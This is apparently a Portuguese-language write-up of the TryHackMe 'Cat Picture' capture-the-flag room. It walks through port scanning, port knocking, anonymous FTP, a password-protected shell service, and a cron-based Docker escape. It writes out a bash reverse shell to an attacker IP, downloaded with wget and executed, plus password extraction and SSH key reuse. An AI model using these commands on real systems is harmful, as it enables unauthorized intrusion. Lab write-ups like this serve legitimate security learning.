---
layout: writeup
title: Cat Picture
platform: thm
difficulty: easy
os: linux
---

Dificuldade | Opinião | 📅 Início | 📅 Conclusão
:--:|:--:|:--:|:--:
![](/assets/img/nivel/button_facil.png) | ![](/assets/img/nivel/button_dificil.png) | 19 de Dezembro de 2022 | 19 de Dezembro de 2022

## Escaneamento

- Comando: `nmap -sSV -v -Pn -p- --min-rate=10000 10.10.182.104 -g 22`

```bash
Nmap scan report for 10.10.182.104
Host is up (0.40s latency).
Not shown: 65530 closed ports
PORT     STATE    SERVICE      VERSION
21/tcp   filtered ftp
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
2375/tcp filtered docker
4420/tcp open     nvm-express?
8080/tcp open     http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
```

## Enumeração

### Web - phpBB (8080)

Na porta 8080 temos um fórum oldschool, o famoso phpBB, não há indícios da versão do fórum inicialmente.

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture.png)

Ao verificar o unico post no site, observa-se que a mensagem indica que tenha uma “knock knock door”, que nada mais é do que uma sequência de portas que, ao receberem uma conexão, abrem outra porta.

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture1.png)

Como eu não tinha nenhum script de port scan pronto, entrei no [ChatGTP](https://chat.openai.com/chat) e pedi por um script simples de port scan que aceitasse hosts e portas como argumento.

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture2.png)

O script gerado é exatamente o que preciso pra fazer `knock knock door`.

```python
import argparse
import socket

# Create an ArgumentParser object
parser = argparse.ArgumentParser()

# Add an argument for the target host
parser.add_argument("host", help="the target host")

# Add an argument for the list of ports
parser.add_argument("ports", help="a comma-separated list of ports to scan")

# Parse the arguments
args = parser.parse_args()

# Extract the target host and the list of ports from the arguments
target_host = args.host
ports = [int(x) for x in args.ports.split(',')]

# Iterate over the list of ports
for port in ports:
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Set a timeout for the connection attempt
    s.settimeout(0.5)

    # Try to connect to the target host on the current port
    try:
        connection = s.connect((target_host, port))
        print(f"Port {port} is open")
    except:
        # If the connection fails, the port is closed
        pass

    # Close the socket
    s.close()
```

Assim executei o script passando como parâmetro o host e as portas alvo.

- Comando: `python3 portscan.py 10.10.250.136 1111,2222,3333,4444`

Em seguida realizei outro scan, porém, com o Nmap para ver qual porta abriu:

- Comando: `nmap -sSV -v -Pn -p- --min-rate=10000 10.10.250.136`

```bash
Nmap scan report for 10.10.250.136
Host is up (0.59s latency).
Not shown: 65530 closed ports
PORT     STATE    SERVICE      VERSION
21/tcp   open     ftp          vsftpd 3.0.3
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
2375/tcp filtered docker
4420/tcp open     nvm-express?
8080/tcp open     http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
```

O FTP agora está aberto para nós e, com isso, consegue-se acessá-lo como anônimo.

- Comando: `ftp 10.10.250.136`

```bash
Connected to 10.10.250.136.
220 (vsFTPd 3.0.3)
Name (10.10.250.136:mithrandir): ftp
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||26489|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||26363|)
150 Opening BINARY mode data connection for note.txt (162 bytes).
100% |***********************************|   162      970.57 KiB/s    00:00 ETA
226 Transfer complete.
162 bytes received in 00:00 (0.38 KiB/s)
ftp> exit
221 Goodbye.
```

> Assim encontramos a senha de acesso no arquivo `note.txt`: `sardinethecat`
{: .prompt-info }

- Comando: `cat note.txt`

```
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is sardinethecat.
- catlover
```

### Shell Interativo (4420)

Ao interagir com a porta 4420, vimos que é um tipo de shell interativo.

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture3.png)

Agora que sabemos a senha podemos conectar no shell

# Exploração (Acesso Inicial)

Utilizando o netcat, conseguimos interarir com o serviço e fazer o “login” no shell.

- Comando: `nc -v 10.10.250.136 4420`

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture4.png)

Não conseguimos utilizar alguns comandos nesse shell restrito, então preparei um arquivo com um shell reverso na minha máquina, subi um servidor http com python e, após baixar na máquina alvo, executei.

```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.13.8.150/1234 0>&1
```
Na máquina alvo: `wget http://10.13.8.150/shell.sh -O /tmp/shell.sh`
Em seguida: `bash /tmp/shell.sh`
![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture5.png)

O shell veio:
- Comando: `rlwrap -cAra nc -lnvp 1234`
![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture6.png)

## Pós-Exploração (Escaneamento Interno)

Dentro da pasta `/home/catlover` existe um executável chamado `runme`, quando executamos, ele pede uma senha. Tentei a senha ja conhecida, sardinethecat, mas sem sucess.

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture7.png)

Transferi o arquivo para minha máquina para poder usar o comando `strings` nele e poder observar todas as strings contidas nele.
- Comando: `strings runme`
![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture8.png)

Nele revela a palavra `rebecca`, que provavelmente é a senha.

E ao testar, confirma-se que realmente é a senha que é pedida:

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture9.png)

## Escalação de Privilégio

Com isso, parti pra testar ná maquina alvo, executei o binário e digitei a senha

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture10.png)

Ao dar um `ls -la` verifica-se que uma chave privada apareceu na pasta

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture11.png)

Assim copiamos a chave, damos a permissão 600 e conectamos no servidor utilizando a chave.

- Comandos:
    - `nano id_rsa_cat`
    - `chmod 600 id_rsa_cat`
    - `pwncat-cs ssh://catlover@10.10.49.88 -i id_rsa_cat`

Ainda não acabou, caímos dentro de um docker…

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture12.png)

Já somos root, então precisamos de um mecanismo para sair dele, então rodei o linpeas pra procurar uma saída que sugeroy o breakout1.

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture13.png)

Após tentar algumas técnicas de escape de container, não encontramos nada… 😞

Então voltei pra enumeração e ao digitar o comando `df`, vemos que que há uma partição montada em `/opt/clean`e, dentro da pasta, há um script que deleta todo o `/tmp`

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture14.png)

O fato curioso é que o nosso `/tmp` não está vazio, então, ou o script não está rodando num `crontab`, ou está rodando fora do container. Como não temos como verificar, podemos testar substituir o script por um shell reverso e rezar pra dar certo.

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture15.png)

E aguardamos… até que… shell… realmente havia um crontab rodando fora do container.

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture16.png)
